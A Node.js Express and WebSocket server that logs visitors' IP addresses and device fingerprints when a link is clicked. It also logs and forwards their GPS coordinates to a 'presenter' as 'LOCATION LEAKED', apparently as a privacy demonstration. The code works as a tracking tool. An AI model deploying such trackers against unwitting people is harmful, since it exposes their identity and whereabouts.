const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const path = require('path');
const fs = require('fs');

const app = express();
app.use(express.json()); // Enable JSON parsing for incoming requests

const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const PORT = process.env.PORT || 3000;

// ANSI color formatting helpers
const colors = {
  reset: '\x1b[0m',
  bright: '\x1b[1m',
  red: '\x1b[31m',
  green: '\x1b[32m',
  yellow: '\x1b[33m',
  cyan: '\x1b[36m'
};

// Helper to extract client IP address
function getClientIp(req) {
  const forwarded = req.headers['x-forwarded-for'];
  if (forwarded) {
    return forwarded.split(',')[0].trim();
  }
  return req.ip || req.connection.remoteAddress;
}

// Helper to log visitor fingerprint
function logVisit(ip, fingerprint) {
  const timestamp = new Date().toLocaleString();
  console.log(`\n${colors.yellow}${colors.bright}==================================================${colors.reset}`);
  console.log(`${colors.yellow}${colors.bright}🔗 LINK CLICKED / VISIT DETECTED @ ${timestamp}${colors.reset}`);
  console.log(`${colors.yellow}--------------------------------------------------${colors.reset}`);
  console.log(`${colors.cyan}IP Address:${colors.reset}   ${ip}`);
  console.log(`${colors.cyan}OS / Browser:${colors.reset} ${fingerprint.browser} on ${fingerprint.os}`);
  console.log(`${colors.cyan}Resolution:${colors.reset}   ${fingerprint.screenRes}`);
  console.log(`${colors.cyan}Timezone:${colors.reset}     ${fingerprint.timeZone}`);
  console.log(`${colors.cyan}Language:${colors.reset}     ${fingerprint.language}`);
  console.log(`${colors.cyan}CPU Cores:${colors.reset}    ${fingerprint.cpuCores}`);
  console.log(`${colors.cyan}GPU Device:${colors.reset}   ${fingerprint.gpu}`);
  console.log(`${colors.cyan}User Agent:${colors.reset}   ${fingerprint.rawUa}`);
  console.log(`${colors.yellow}${colors.bright}==================================================${colors.reset}\n`);

  const logLine = `[${timestamp}] VISIT - IP: ${ip}, OS: ${fingerprint.os}, Browser: ${fingerprint.browser}, GPU: ${fingerprint.gpu}, Resolution: ${fingerprint.screenRes}\n`;

  // Write log to file safely (read-only file system protection)
  try {
    fs.appendFile(path.join(__dirname, 'visits.log'), logLine, (err) => {
      // Intentionally ignore EROFS (Read-only file system) errors on Vercel
    });
  } catch (fsErr) {
    // Catch synchronous errors if any
  }
}

// Helper to log location permission decision and coordinates/details
function logLocation(ip, locationData) {
  const timestamp = new Date().toLocaleString();
  let logLine = '';

  if (locationData.lat !== null && locationData.lng !== null) {
    console.log(`\n${colors.red}${colors.bright}==================================================${colors.reset}`);
    console.log(`${colors.red}${colors.bright}📍 LOCATION LEAKED (GRANTED) @ ${timestamp}${colors.reset}`);
    console.log(`${colors.red}--------------------------------------------------${colors.reset}`);
    console.log(`${colors.cyan}IP Address:${colors.reset}   ${ip}`);
    console.log(`${colors.cyan}Latitude:${colors.reset}     ${locationData.lat}`);
    console.log(`${colors.cyan}Longitude:${colors.reset}    ${locationData.lng}`);
    console.log(`${colors.cyan}Accuracy:${colors.reset}     ±${Math.round(locationData.accuracy)}m`);
    console.log(`${colors.cyan}Address:${colors.reset}      ${locationData.address}`);
    console.log(`${colors.red}${colors.bright}==================================================${colors.reset}\n`);

    logLine = `[${timestamp}] LOCATION GRANTED - IP: ${ip}, Lat: ${locationData.lat}, Lng: ${locationData.lng}, Accuracy: ±${Math.round(locationData.accuracy)}m, Address: ${locationData.address}\n`;
  } else {
    console.log(`\n${colors.green}${colors.bright}==================================================${colors.reset}`);
    console.log(`${colors.green}${colors.bright}🛡️ LOCATION BLOCKED (DENIED) @ ${timestamp}${colors.reset}`);
    console.log(`${colors.green}--------------------------------------------------${colors.reset}`);
    console.log(`${colors.cyan}IP Address:${colors.reset}   ${ip}`);
    console.log(`${colors.green}Message: The user denied location permission request.${colors.reset}`);
    console.log(`${colors.green}${colors.bright}==================================================${colors.reset}\n`);

    logLine = `[${timestamp}] LOCATION DENIED - IP: ${ip}\n`;
  }

  // Write log to file safely (read-only file system protection)
  try {
    fs.appendFile(path.join(__dirname, 'visits.log'), logLine, (err) => {
      // Intentionally ignore EROFS (Read-only file system) errors on Vercel
    });
  } catch (fsErr) {
    // Catch synchronous errors if any
  }
}

// API endpoint for when a visitor loads the landing page
app.post('/api/visit', (req, res) => {
  const ip = getClientIp(req);
  const fingerprint = req.body.fingerprint;
  if (fingerprint) {
    logVisit(ip, fingerprint);
  }
  res.json({ success: true });
});

// API endpoint for when a visitor grants or denies location access
app.post('/api/location', (req, res) => {
  const ip = getClientIp(req);
  const locationData = req.body.location;
  if (locationData) {
    logLocation(ip, locationData);
  }
  res.json({ success: true });
});

// Serve static assets from 'public' directory
app.use(express.static(path.join(__dirname, 'public')));

// Fallback to index.html for single-page routing (if not serving static files directly)
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Store active presenter sessions: Map<code, { presenterWs, timeoutId }>
const sessions = new Map();

// Helper to generate a random 6-digit pairing code
function generatePairingCode() {
  return Math.floor(100000 + Math.random() * 900000).toString();
}

wss.on('connection', (ws) => {
  console.log('New WebSocket connection established.');

  let clientCode = null;
  let clientRole = null; // 'presenter' or 'visitor'

  ws.on('message', (message) => {
    try {
      const payload = JSON.parse(message);
      
      switch (payload.type) {
        case 'init_presenter':
          handleInitPresenter(ws);
          break;
        case 'pair_request':
          handlePairRequest(ws, payload.code, payload.location);
          break;
        default:
          ws.send(JSON.stringify({ type: 'error', message: 'Unknown action type.' }));
      }
    } catch (err) {
      console.error('Error handling message:', err);
      ws.send(JSON.stringify({ type: 'error', message: 'Invalid message format.' }));
    }
  });

  ws.on('close', () => {
    console.log(`Connection closed. Role: ${clientRole}, Code: ${clientCode}`);
    if (clientRole === 'presenter' && clientCode) {
      const session = sessions.get(clientCode);
      if (session) {
        clearTimeout(session.timeoutId);
        sessions.delete(clientCode);
        console.log(`Presenter session ${clientCode} removed due to disconnection.`);
      }
    }
  });

  function handleInitPresenter(presenterWs) {
    clientRole = 'presenter';
    // Generate unique 6-digit code
    let code;
    let attempts = 0;
    do {
      code = generatePairingCode();
      attempts++;
    } while (sessions.has(code) && attempts < 10);

    clientCode = code;

    // Set 5-minute timeout for session expiration
    const timeoutId = setTimeout(() => {
      presenterWs.send(JSON.stringify({ type: 'code_expired' }));
      sessions.delete(code);
      console.log(`Presenter session ${code} expired.`);
    }, 5 * 60 * 1000); // 5 minutes

    sessions.set(code, { presenterWs, timeoutId });
    console.log(`Presenter session created. Code: ${code}`);

    presenterWs.send(JSON.stringify({
      type: 'session_created',
      code: code,
      expiresIn: 300 // seconds
    }));
  }

  function handlePairRequest(visitorWs, code, location) {
    clientRole = 'visitor';
    if (!code) {
      visitorWs.send(JSON.stringify({ type: 'pair_response', success: false, error: 'Code is required.' }));
      return;
    }

    const session = sessions.get(code);
    if (!session) {
      visitorWs.send(JSON.stringify({ type: 'pair_response', success: false, error: 'Invalid or expired session code.' }));
      return;
    }

    const { presenterWs, timeoutId } = session;

    // Verify coordinates are present
    if (!location || typeof location.lat !== 'number' || typeof location.lng !== 'number') {
      visitorWs.send(JSON.stringify({ type: 'pair_response', success: false, error: 'Valid location coordinates are required.' }));
      return;
    }

    // Forward the location details to the presenter
    presenterWs.send(JSON.stringify({
      type: 'location_update',
      location: {
        lat: location.lat,
        lng: location.lng,
        address: location.address || 'Unknown address'
      }
    }));

    // Invalidate/delete the session code immediately (enforcing one-time use)
    clearTimeout(timeoutId);
    sessions.delete(code);
    console.log(`Pairing complete. Presenter session ${code} terminated (one-time use enforced).`);

    // Acknowledge visitor success
    visitorWs.send(JSON.stringify({ type: 'pair_response', success: true }));
  }
});

server.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});
